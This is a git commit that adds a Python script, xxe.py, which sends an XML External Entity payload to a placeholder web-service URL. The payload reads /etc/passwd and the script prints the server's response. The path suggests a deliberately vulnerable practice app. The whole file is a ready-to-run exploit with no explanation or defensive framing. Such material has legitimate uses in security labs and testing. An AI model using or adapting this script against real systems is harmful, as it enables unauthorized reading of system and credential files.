94a591a2de4bb20b77284aa59807c523eb254b1e
indranilsahahl <indranil.saha@gmail.com>
2025-07-06 18:20:13 +0530

    Create xxe.py

---
+++ xxe.py
@@ -0,0 +1,28 @@
+import requests
+
+TARGET_URL = 'http://target-ip-or-host/dvwsuserservice/'  # Change this
+HEADERS = {
+    'Content-Type': 'application/xml',
+    'User-Agent': 'Mozilla/5.0'
+}
+
+# Malicious XXE Payload to read /etc/passwd
+payload = '''<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<user>
+  <username>&xxe;</username>
+  <password>test</password>
+</user>
+'''
+
+def exploit_xxe():
+    print(f"[+] Sending XXE payload to {TARGET_URL}")
+    response = requests.post(TARGET_URL, headers=HEADERS, data=payload)
+    print(f"[+] Status Code: {response.status_code}")
+    print("[+] Response Content:\n")
+    print(response.text)
+
+if __name__ == '__main__':
+    exploit_xxe()
